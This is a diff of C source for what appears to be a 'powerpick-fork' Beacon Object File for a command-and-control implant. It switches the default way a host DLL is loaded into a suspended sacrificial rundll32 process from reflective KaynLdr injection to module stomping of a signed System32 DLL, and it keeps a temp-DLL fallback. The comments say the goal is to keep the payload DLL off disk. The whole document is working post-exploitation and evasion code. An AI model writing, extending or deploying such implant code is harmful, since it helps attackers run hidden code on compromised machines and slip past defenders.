@@ -1,11 +1,10 @@
 /*
  * powerpick-fork agent BOF:
- *   mailslot + payload mapping -> CreateProcess(rundll32 "host.dll",PowerPickForkRun map)
+ *   mailslot + payload mapping -> sacrificial rundll32
  *   -> wait / read mailslot -> cleanup
  *
- * Inject-into-RuntimeBroker was abandoned for MVP after 0xC0000005 crashes under
- * suspended LoadLibrary; rundll32 is still Microsoft-signed and loads the host
- * through a normal export call.
+ * Preferred host load: module-stomp a signed System32 DLL in the child
+ * (no ppf*.dll). Falls back to classic rundll32 "host.dll",PowerPickForkRun.
  */
 #include <windows.h>
 #include "beacon.h"
@@ -388,13 +387,19 @@ static BOOL PpfCreateSacrificial(
 }
 
 /*
- * Child-only KaynLdr path: BOF writes raw host DLL + CreateRemoteThread(KaynLoader).
- * PE mapping runs inside the sacrificial process (not in the agent).
+ * Host load strategies (first match wins; else classic temp-DLL rundll32):
+ *   PPF_USE_MODULE_STOMP   — LoadLibraryEx(victim,DONT_RESOLVE) + overwrite
+ *   PPF_USE_REFLECTIVE_HOST — KaynLdr (historically 0xC0000005 / hangs)
  */
-#ifndef PPF_USE_REFLECTIVE_HOST
-#define PPF_USE_REFLECTIVE_HOST 1
+#ifndef PPF_USE_MODULE_STOMP
+#define PPF_USE_MODULE_STOMP 1
 #endif
-#if PPF_USE_REFLECTIVE_HOST
+#ifndef PPF_USE_REFLECTIVE_HOST
+#define PPF_USE_REFLECTIVE_HOST 0
+#endif
+#if PPF_USE_MODULE_STOMP
+#include "powerpick_fork_stomp.h"
+#elif PPF_USE_REFLECTIVE_HOST
 #include "powerpick_fork_kayn_inject.h"
 #endif
 
@@ -825,8 +830,8 @@ void go(IN PCHAR buffer, IN ULONG blength)
         goto cleanup;
     }
 
-#if PPF_USE_REFLECTIVE_HOST
-    /* KaynLdr: suspended rundll32 + raw DLL in memory (no host file on disk). */
+#if PPF_USE_MODULE_STOMP || PPF_USE_REFLECTIVE_HOST
+    /* Suspended rundll32 shell; host loaded without a ppf*.dll on disk. */
     MSVCRT$_snprintf(cmdA, 1024, "\"%s\"", loader);
     if (!AsciiToWide(cmdA, cmdW, 1024)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert rundll32 command line");
@@ -841,7 +846,11 @@ void go(IN PCHAR buffer, IN ULONG blength)
             &si,
             &pi)) {
         createdProcess = TRUE;
+#if PPF_USE_MODULE_STOMP
+        if (!PpfStompHostDll(pi.hProcess, hostDll, hostDllLen, mapName)) {
+#else
         if (!PpfInjectKaynHost(pi.hProcess, hostDll, hostDllLen, mapName)) {
+#endif
             KERNEL32$TerminateProcess(pi.hProcess, 1);
             if (pi.hThread) {
                 KERNEL32$CloseHandle(pi.hThread);
@@ -852,6 +861,9 @@ void go(IN PCHAR buffer, IN ULONG blength)
                 pi.hProcess = NULL;
             }
             createdProcess = FALSE;
+            BeaconPrintf(
+                CALLBACK_ERROR,
+                "[!] In-memory host load failed; falling back to temp DLL");
         }
     }
 #endif
